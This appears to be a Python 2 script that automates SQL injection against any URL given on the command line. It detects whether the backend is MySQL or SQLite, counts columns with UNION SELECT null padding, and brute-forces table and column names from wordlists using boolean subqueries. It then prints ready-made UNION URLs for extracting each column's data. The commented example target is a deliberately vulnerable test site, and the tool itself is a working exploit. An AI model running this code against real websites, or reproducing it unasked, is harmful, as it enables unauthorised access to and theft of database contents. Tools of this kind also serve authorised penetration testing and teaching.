import urllib2
import re
import sys
import logging

FORMAT = "[%(levelname)s:%(asctime)s:%(funcName)s()] %(message)s"
logging.basicConfig(format=FORMAT, level=logging.DEBUG)

# url="http://testphp.vulnweb.com/listproducts.php?cat=2"
# url="http://testphp.vulnweb.com/listproducts.php?cat=2%20union%20select%20null,null,null,null,null,null,null,null,null,null%20from%20information_schema.columns"
url = sys.argv[1]
table_data = "keywords/common-tables.txt"
column_data = "keywords/common-columns.txt"

#if sys.argv[2] is not None:
#    table_data = sys.argv[2]

#if sys.argv[3] is not None:
#    column_data = sys.argv[3]


# column_data=sys.argv[3]


##Function to find the number of columns used in url page using UNION query

def run_union_query(url, dbname):
    logging.info(url)
    regex = re.compile('Error|SELECT statement', re.IGNORECASE)
    # print the_page
    null_holder = "null,"
    sql = ""
    if dbname == "mysql":
        sql = "union select {0} from information_schema.columns"
    elif dbname == "sqlite":
        sql = "union select {0} from SQLITE_MASTER"
    null_holder_count = 1
    url_withsql=""
    while True:
        url_withsql = url + " " + sql.format((null_holder * null_holder_count)[:-1])
        # null_holder+=","
        #print url_withsql
        req = urllib2.Request(url_withsql)
        response = urllib2.urlopen(req)
        the_page = response.read()
        # print the_page
        # print regex.search(the_page)
        if regex.search(the_page) is None:
            break
        null_holder_count += 1
    # print the_page
    return null_holder_count,url_withsql


##A function to find the name of the table in the web application using the default/given dataset

def run_table_query(url):
    logging.info("Inside run table query")
    regex = re.compile('Error|Table doesn\'t exist', re.IGNORECASE)
    sql = "and (SELECT 1 from {0})=1"
    file = open(table_data, "r")
    table_name = ""
    result = []
    count=1
    for line in file:
        if count==100:
            break
        count+=1
        url_withsql = url + " " + sql.format(line.replace("\n", ""))
        # null_holder+=","
        #print url_withsql
        req = urllib2.Request(url_withsql)
        response = urllib2.urlopen(req)
        the_page = response.read()
        if regex.search(the_page) is None:
            if line is not "":
                result.append(line.replace("\n",""))
    file.close()
    return result


##A function to find the name of the column for a given table in the web application using the default/given dataset

def run_column_query(url, table):
    logging.info("Inside run column query")
    regex = re.compile('Error|Unknown column', re.IGNORECASE)
    sql = "and (SELECT substring(concat(1,{0}),1,1) from " + table + " limit 0,1)=1"
    file = open(column_data, "r")
    table_name = ""
    result = []
    count=1
    for line in file:
        if count==200:
            break
        count+=1
        url_withsql = url + " " + sql.format(line.replace("\n", ""))
        # null_holder+=","
        # print url_withsql
        req = urllib2.Request(url_withsql)
        response = urllib2.urlopen(req)
        the_page = response.read()
        if regex.search(the_page) is None:
            if line is not "":
                result.append(line.replace("\n", ""))
    file.close()
    return result


# A method to find the name of the database if the the URL is prone to sql injection attack

def find_db(url):

    sql = "and SELECT"
    regex_mysql = re.compile('mysql', re.IGNORECASE)
    regex_sqlite = re.compile('sqlite', re.IGNORECASE)
    req = urllib2.Request(url + " " + sql) #http request
    #print url + " " + sql
    response = urllib2.urlopen(req)
    the_page = response.read()
    if regex_mysql.search(the_page) is not None:
        logging.info("mysql db")
        return "mysql"
    elif regex_sqlite.search(the_page) is not None:
        logging.info("sqlite db")
        return "sqlite"
    else:
        logging.info("db not found")
        return None


## A wrapper function to automate sql injection attack

def sql_injection(url):
    try:
        logging.info("Program execution started")
        finddb = find_db(url)
        if finddb == "mysql":
            logging.info("The database is mysql")
            union_result,union_url=run_union_query(url,finddb)
            logging.info("The total number of columns in select clause is "+str(union_result))
            tables=run_table_query(url)
            logging.info("Tables Found: "+str(tables))
            for table in tables:
                columnlist=run_column_query(url, table)
                logging.info("Columns Found: "+str(columnlist))
                print "The following URL can be tried to retrive the data for the column"
                for column in columnlist:
                    #print column
                    print union_url.replace("null",column).replace("information_schema.columns",table)
            #print tables
        elif finddb == "sqlite":
            logging.info("The database is sqlite")
            union_result, union_url = run_union_query(url, finddb)
            logging.info("The total number of columns in select clause is " + str(union_result))
            tables = run_table_query(url)
            logging.info("Tables Found: " + str(tables))
            for table in tables:
                columnlist = run_column_query(url, table)
                logging.info("Columns Found: " + str(columnlist))
                print "The following URL can be tried to retrive the data for the column"
                for column in columnlist:
                    # print column
                    print union_url.replace("null", column).replace("SQLITE_MASTER", table)
        else:
            logging.info("Not Mysql or Sqlite db")
            logging.info("The URL may not have sql injection vulnerability")
            return
    except Exception:
        logging.info("The URL may not have sql injection vulnerability")
        logging.error(Exception)
    pass


sql_injection(url)
# run_union_query(url)
# run_table_query(url)
# run_column_query(url,"users")
